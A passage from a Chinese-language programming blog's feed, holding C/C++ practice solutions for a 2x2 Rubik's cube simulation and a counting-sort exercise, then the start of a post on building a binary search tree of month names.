class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span>  </span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;  <br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">2</span>;  <br><span class="hljs-type">char</span> font[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>&#125;&#125;;<br><span class="hljs-type">char</span> leftt[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> rightt[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> top[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> down[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> back[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> op[<span class="hljs-number">1000</span>];<br><span class="hljs-comment">//void getprint(char (*data)[maxn]) </span><br><span class="hljs-comment">//&#123;  </span><br><span class="hljs-comment">//for(int i = 0; i &lt; maxn; ++i)</span><br><span class="hljs-comment">//&#123;  </span><br><span class="hljs-comment">//for(int j = 0; j &lt; maxn; ++j)  </span><br><span class="hljs-comment">//&#123;  </span><br><span class="hljs-comment">//cout &lt;&lt; data[i][j] &lt;&lt; &quot; \n&quot;[j==maxn];  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printans</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c\n&quot;</span>,top[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],top[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c\n&quot;</span>,top[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],top[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c %c %c %c %c %c %c\n&quot;</span>,leftt[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],leftt[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],font[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],font[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],rightt[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],rightt[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],back[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],back[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c %c %c %c %c %c %c\n&quot;</span>,leftt[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],leftt[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],font[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],font[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],rightt[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],rightt[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],back[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],back[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c\n&quot;</span>,down[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],down[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c&quot;</span>,down[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],down[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-comment">//void swap(char *a, char *b) &#123;  </span><br><span class="hljs-comment">//char c;  </span><br><span class="hljs-comment">//c = *a;  </span><br><span class="hljs-comment">//*a = *b;  </span><br><span class="hljs-comment">//*b = c;  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapF</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//上、右、下、左</span><br><span class="hljs-type">char</span> tmp1 = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> tmp2 = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//下-&gt;左</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//右-&gt;下</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">//上-&gt;右</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//左-&gt;上</span><br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = tmp1;<span class="hljs-comment">//(data4[1][1])</span><br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//(data4[0][1])</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapf</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//上、右、下、左</span><br><span class="hljs-comment">//保存上</span><br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//右-&gt;上</span><br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">//下-&gt;右</span><br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//左-&gt;下</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//上-&gt;左</span><br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp1;<span class="hljs-comment">//(data1[1][0])</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//(data1[1][1])</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapU</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//U:后、左、前、右</span><br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//前-&gt;右</span><br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//左-&gt;前</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//后-&gt;左</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<span class="hljs-comment">//!!!</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<span class="hljs-comment">//!!!</span><br><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = tmp1;<span class="hljs-comment">//!!!data1[0][0]</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//!!!data1[0][1]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapR</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><span class="hljs-comment">//前、上、后、下</span><br><span class="hljs-comment">//下-&gt;前</span><br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//后-&gt;下</span><br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];  <span class="hljs-comment">//!!!</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]; <span class="hljs-comment">//!!!</span><br><br><span class="hljs-comment">//上-&gt;后</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//前-上</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp1;<span class="hljs-comment">//data1[0][1]</span><br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//data1[1][1]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapr</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-comment">//前、上、后、下</span><br><span class="hljs-comment">//保存前</span><br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//上-&gt;前</span><br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//后-&gt;上</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];  <span class="hljs-comment">//!!!</span><br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]; <span class="hljs-comment">//!!!</span><br><br>data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp1;<span class="hljs-comment">//data1[0][1]</span><br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//data1[1][1]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">adjust</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data)[maxn],<span class="hljs-type">int</span> op)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> tmp = data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br><span class="hljs-keyword">if</span>(op == <span class="hljs-number">1</span>)&#123;<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = tmp;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>  </span><br><span class="hljs-function"></span>&#123;  <br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,op);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-built_in">strlen</span>(op);++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;F&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(font,<span class="hljs-number">1</span>);<span class="hljs-comment">//顺时针旋转正面</span><br><span class="hljs-built_in">getswapF</span>(top,rightt,down,leftt);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;f&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(font,<span class="hljs-number">0</span>);<span class="hljs-comment">//逆时针旋转正面</span><br><span class="hljs-built_in">getswapf</span>(top,rightt,down,leftt);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;u&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(top,<span class="hljs-number">0</span>);<span class="hljs-comment">//逆时针旋转顶面</span><br><span class="hljs-built_in">getswapU</span>(rightt,font,leftt,back);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;U&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(top,<span class="hljs-number">1</span>);<span class="hljs-comment">//顺时针旋转顶面</span><br><span class="hljs-built_in">getswapU</span>(back,leftt,font,rightt);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;R&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(rightt,<span class="hljs-number">1</span>);<span class="hljs-comment">//顺时针旋转右面</span><br><span class="hljs-built_in">getswapR</span>(font,top,back,down);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;r&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(rightt,<span class="hljs-number">0</span>);<span class="hljs-comment">//逆时针旋转右面</span><br><span class="hljs-built_in">getswapr</span>(font,top,back,down);<br>&#125;<br>&#125;<br><span class="hljs-built_in">printans</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>队列      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-built_in">map</span>&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; mp;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> n,x;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>mp[x]++;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">-10000</span>;i&lt;=<span class="hljs-number">10000</span>;i++)&#123;<br><span class="hljs-keyword">while</span>(mp[i]&gt;<span class="hljs-number">0</span>)&#123;<br>mp[i]--;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,i);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-21475da1" role="button" aria-expanded="false" aria-controls="collapse-21475da1">        <div class="fold-arrow">▶</div>小结      </div>      <div class="fold-collapse collapse" id="collapse-21475da1">        <div class="fold-content">          <p><strong>是对C语言的复习，同时也为后边做了铺垫。</strong></p><p><strong>数组合并：这种有序合并方式是（第十章）归并排序的核心操作之一。</strong><br><strong>二阶魔方：模拟题，模拟方式是数组元素的交换，考验耐心。</strong><br><strong>队列：典型桶排序（第十章）。</strong></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-树(中)</title>
    <link href="/dong.github/2024/09/10/Datastructures-%E6%A0%91-%E4%B8%AD/"/>
    <url>/dong.github/2024/09/10/Datastructures-%E6%A0%91-%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><h1 id="引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树"><a href="#引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树" class="headerlink" title="引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树"></a>引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">char</span>* months[<span class="hljs-number">12</span>] = &#123;  <br><span class="hljs-string">&quot;January&quot;</span>, <span class="hljs-string">&quot;February&quot;</span>, <span class="hljs-string">&quot;March&quot;</span>, <span class="hljs-string">&quot;April&quot;</span>,    <br><span class="hljs-string">&quot;May&quot;</span>, <span class="hljs-string">&quot;June&quot;</span>, <span class="hljs-string">&quot;July&quot;</span>, <span class="hljs-string">&quot;August&quot;</span>,    <br><span class="hljs-string">&quot;September&quot;</span>, <span class="hljs-string">&quot;October&quot;</span>, <span class="hljs-string">&quot;November&quot;</span>, <span class="hljs-string">&quot;December&quot;</span>    <br>&#125;;  <br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dd624aea" role="button" aria-expanded="false" aria-controls="collapse-dd624aea">        <div class="fold-arrow">▶</div>解答      </div>      <div class="fold-collapse collapse" id="collapse-dd624aea">        <div class="fold-content">          <p><strong>综合了前边所有的前置知识，还用到了C语言相关基础。</strong><br><strong>避坑！：第一个指针T必须事先赋值为NULL，不然会出现一个segmentation fault-段错误，指到了不该指的地方。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 